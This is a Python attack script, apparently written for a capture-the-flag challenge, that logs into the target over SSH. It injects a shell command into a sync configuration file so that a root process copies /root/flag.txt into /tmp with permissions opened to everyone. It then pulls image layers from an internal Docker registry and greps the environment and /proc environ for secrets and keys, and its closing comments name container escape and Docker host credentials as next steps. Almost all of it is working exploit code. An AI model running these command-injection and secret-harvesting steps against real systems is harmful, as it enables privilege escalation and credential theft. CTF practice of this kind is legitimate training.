#!/usr/bin/env python3
"""Final focused flag extraction based on discovered sync mechanism"""
import paramiko
import time

HOST = "instance.ctf.tdho.st"
PORT = 32971
USER = "player"
PASSWORD = "reyalp"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(HOST, port=PORT, username=USER, password=PASSWORD, timeout=10)

def cmd(c, timeout=15):
    stdin, stdout, stderr = ssh.exec_command(c, timeout=timeout)
    return (stdout.read() + stderr.read()).decode()

print("[*] FINAL FLAG EXTRACTION ATTEMPT")
print("[*] Based on sync-agent.sh analysis: sync-loop copies config to .sync/sync.trigger")

# The sync-loop might be evaluating or executing the command in sync-request.conf
# Try the "force" variant mentioned in the comments
print("\n[1] Using talldwarf-sync-force variant...")
cmd('echo "talldwarf-sync-force=cat /root/flag.txt > /tmp/flag.txt && chmod 777 /tmp/flag.txt" > /opt/mc/config/sync-request.conf')
time.sleep(12)
result = cmd("cat /tmp/flag.txt 2>/dev/null")
if result.strip():
    print(f"[FLAG]: {result}")
    ssh.close()
    exit(0)

# Try the base64 encoded version mentioned in comments
print("\n[2] Trying base64 encoded command...")
import base64
b64_cmd = base64.b64encode(b"cat /root/flag.txt").decode()
cmd(f'echo "{b64_cmd}" > /opt/mc/config/sync-request.conf')
time.sleep(12)

# Maybe the sync-loop writes output to a specific location based on the command
print("\n[3] Checking all possible output locations...")
locations = [
    "/tmp/flag.txt",
    "/tmp/flag",
    "/tmp/f",
    "/tmp/f.txt",
    "/tmp/x",
    "/tmp/y",
    "/tmp/.flag",
    "/tmp/.f",
    "/dev/shm/flag",
    "/dev/shm/flag.txt",
    "/dev/shm/f",
    "/opt/mc/.sync/sync.result",
    "/opt/mc/.sync/output",
    "/opt/mc/.sync/flag",
    "/opt/mc/logs/flag",
    "/opt/mc/logs/flag.txt",
    "/opt/mc/logs/output.log",
    "/opt/mc/logs/sync.log"
]

for loc in locations:
    result = cmd(f"cat {loc} 2>/dev/null")
    if result.strip() and ("tdho{" in result or "flag{" in result or "HTB{" in result):
        print(f"\n[FLAG FOUND at {loc}]:")
        print(result)
        ssh.close()
        exit(0)

# Maybe we need to check the watcher's sync-loop.sh instead
print("\n[4] Extracting watcher's full layer...")
extract_watcher = '''python3 << 'PY'
import urllib.request
import json
import gzip
import tarfile
import io

reg = "http://172.27.0.1:5000"
img = "images/stolen-schematics-watcher"

req = urllib.request.Request(
    f"{reg}/v2/{img}/manifests/v1",
    headers={"Accept": "application/vnd.oci.image.manifest.v1+json"}
)
with urllib.request.urlopen(req) as r:
    manifest = json.loads(r.read().decode())
    
    # Get the small layer
    if 'layers' in manifest:
        layer = manifest['layers'][-1]  # Last layer
        digest = layer['digest']
        
        with urllib.request.urlopen(f"{reg}/v2/{img}/blobs/{digest}") as br:
            blob_data = br.read()
            decompressed = gzip.decompress(blob_data)
            tar = tarfile.open(fileobj=io.BytesIO(decompressed))
            
            for member in tar.getmembers():
                print(f"{member.name} ({member.size} bytes)")
                if member.isfile() and member.size < 5000:
                    try:
                        content = tar.extractfile(member).read().decode('utf-8', errors='ignore')
                        print(f"\\n=== {member.name} ===")
                        print(content)
                    except:
                        pass
            tar.close()
PY
'''
print(cmd(extract_watcher, timeout=20))

# Last resort - check if there's an environment variable or other hint
print("\n[5] Checking for other clues...")
print(cmd("env | grep -iE '(flag|secret|key)' 2>/dev/null"))
print(cmd("cat /proc/16/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE '(flag|secret|key)'"))

ssh.close()
print("\n[!] Flag not found. Challenge may require different approach.")
print("[!] Possible next steps:")
print("    - Find actual sync-loop.sh implementation (not sync-agent.sh)")
print("    - Discover SSH credentials for Docker host")
print("    - Find alternative container escape method")
